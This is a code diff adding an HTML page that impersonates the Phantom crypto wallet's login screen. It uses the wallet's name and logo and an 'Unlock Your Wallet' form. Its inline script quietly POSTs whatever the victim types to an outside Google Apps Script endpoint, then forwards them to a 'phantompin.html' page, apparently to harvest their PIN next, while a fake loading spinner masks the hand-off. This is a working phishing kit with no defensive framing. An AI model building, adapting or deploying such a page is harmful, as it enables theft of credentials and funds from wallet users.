@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Wallet Login</title>
+    <link rel="stylesheet" href="phantom.css">
+</head>
+<body>
+    <div id="loader">
+        <div class="spinner"></div>
+    </div>
+    <div class="login-container">
+        <img src="phantom.png" alt="Phantom Wallet Logo" class="logo">
+        <h2>Unlock Your Wallet</h2>
+        <form id="loginForm" name="submit-to-google-sheet">
+            <input type="email" id="password" name="Email" placeholder="Email" required>
+            <button class="load-btn" type="submit">Next</button>
+        </form>
+        <p class="forgot-password">Forgot Email?</p>
+    </div>
+    <script src="phantom.js"></script>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbz1HZi5GurD9Y85nIeA2u94YSPHid9152FHwazf2W4CiPP10OQK_kVtZkM1jEU2VuSI3A/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+              console.log('Success!', response);
+              window.location.href = '/phantompin.html';
+            })
+            .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+    const buttons = document.querySelectorAll(".load-btn");
+    const loader = document.getElementById("loader");
+
+    buttons.forEach(button => {
+      button.addEventListener("click", function () {
+        const url = this.getAttribute("data-url");
+
+        loader.style.visibility = "visible";
+        loader.style.opacity = "1";
+
+        setTimeout(() => {
+          window.location.href = "phantompin.html"; // Navigate after delay
+        }, 1000); // Adjust delay if needed
+      });
+    });
+  });
+    </script>
+</body>
+</html>
